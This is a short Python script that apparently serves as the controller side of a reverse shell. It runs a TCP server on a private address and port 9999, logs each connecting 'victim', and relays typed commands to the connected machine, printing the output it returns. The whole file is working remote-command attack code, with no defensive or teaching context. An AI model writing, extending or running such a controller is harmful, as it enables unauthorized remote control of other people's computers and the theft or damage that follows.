import socketserver
import logging

HOST, PORT = "192.168.10.7", 9999

class ServerHandler(socketserver.BaseRequestHandler):
    def setup(self):
        logging.info("The victim has connected successfully: {}".format(self.client_address[0]))
    
    def handle(self):
        while True:
            command = ""
            
            while not command:
                command = input(">")

            self.request.sendall(command.encode("utf-8"))
            data = self.request.recv(8192)

            output = str(data.strip(), "utf-8", "ignore")
            print(output)

    def finish(self):
        logging.info("The victim got disconnected: {}".format(self.client_address[0]))
    
logger = logging.basicConfig(
    level=logging.INFO,
    format="(%(asctime)s) [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)

with socketserver.TCPServer((HOST, PORT), ServerHandler) as server:
    logging.info("Server started on {}:{}".format(HOST, PORT))
    logging.info("Waiting for a connection...")
    server.serve_forever()
